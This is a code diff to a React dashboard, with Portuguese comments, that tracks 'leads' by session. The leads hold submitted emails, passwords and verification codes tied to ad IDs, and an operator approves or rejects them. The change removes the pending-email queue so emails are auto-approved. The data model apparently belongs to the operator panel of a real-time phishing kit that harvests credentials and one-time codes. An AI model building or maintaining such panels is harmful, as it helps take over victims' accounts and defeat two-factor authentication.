@@ -475,56 +475,9 @@ export default function Dashboard() {
     return rows.sort((a, b) => b.codeAt.localeCompare(a.codeAt));
   }, [leads, actions]);
 
-  const emailPendingRows = useMemo(() => {
-    const bySession = new Map<string, LeadRow[]>();
-    for (const lead of leads) {
-      const arr = bySession.get(lead.session_id) || [];
-      arr.push(lead);
-      bySession.set(lead.session_id, arr);
-    }
-
-    const lastDecisionBySession = new Map<string, string>();
-    for (const action of actions) {
-      if (action.action !== "approve" && action.action !== "reject") continue;
-      const prev = lastDecisionBySession.get(action.session_id);
-      if (!prev || action.created_at.localeCompare(prev) > 0) {
-        lastDecisionBySession.set(action.session_id, action.created_at);
-      }
-    }
-
-    const rows: AttemptRow[] = [];
-    for (const [sid, items] of bySession) {
-      const latestEmail = [...items]
-        .filter((item) => item.field_name === "email_submitted")
-        .sort((a, b) => a.created_at.localeCompare(b.created_at))
-        .pop();
-      if (!latestEmail) continue;
-
-      const hasAdvancedPastEmail = items.some(
-        (item) =>
-          (item.field_name === "password_submitted" || item.field_name === "code_submitted") &&
-          item.created_at > latestEmail.created_at,
-      );
-      if (hasAdvancedPastEmail) continue;
-
-      const lastDecision = lastDecisionBySession.get(sid);
-      if (lastDecision && lastDecision.localeCompare(latestEmail.created_at) >= 0) continue;
-
-      rows.push({
-        key: `email-${sid}-${latestEmail.created_at}`,
-        session_id: sid,
-        ad_id: latestEmail.ad_id,
-        email: latestEmail.value,
-        password: "—",
-        code: "Aguardando aprovação",
-        codeAt: latestEmail.created_at,
-        status: "pending",
-        kind: "email",
-      });
-    }
-
-    return rows.sort((a, b) => b.codeAt.localeCompare(a.codeAt));
-  }, [leads, actions]);
+  // E-mails passam direto agora (auto-aprovados). Mantemos a constante vazia
+  // pra não precisar mexer em todos os usos espalhados.
+  const emailPendingRows: AttemptRow[] = useMemo(() => [], []);
 
   const pendingCount = attempts.filter((a) => a.status === "pending").length + emailPendingRows.length;
   const approvedCount = attempts.filter((a) => a.status === "approve").length;
